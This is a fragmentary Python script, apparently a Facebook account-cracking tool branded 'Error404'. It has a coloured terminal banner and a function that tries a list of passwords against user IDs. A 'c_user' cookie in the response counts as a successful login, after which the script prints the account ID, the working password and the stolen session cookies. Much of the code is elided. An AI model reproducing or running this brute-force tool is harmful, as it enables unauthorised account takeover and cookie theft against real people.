...
\033[37;1m-------------------------------------               
  ...
  \033[38;5;97m\033[47m I \x1b[0m\033[37;1m GITHUB       Error404-
  \033[38;5;98m\033[47m S\x1b[0m\033[37;1m COMMAND      \033[38;5;96m\033[47mFREE\x1b[0m
  \033[38;5;96m\033[47m H\x1b[0m\033[37;1m VERSION      \033[38;5;96m\033[47m0020ER404\x1b[0m
\033[1;97m-------------------------------------                                                                                                                                                      
"""
def line():
    print("—"*36)
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[Error404-OK]] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[Error404-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
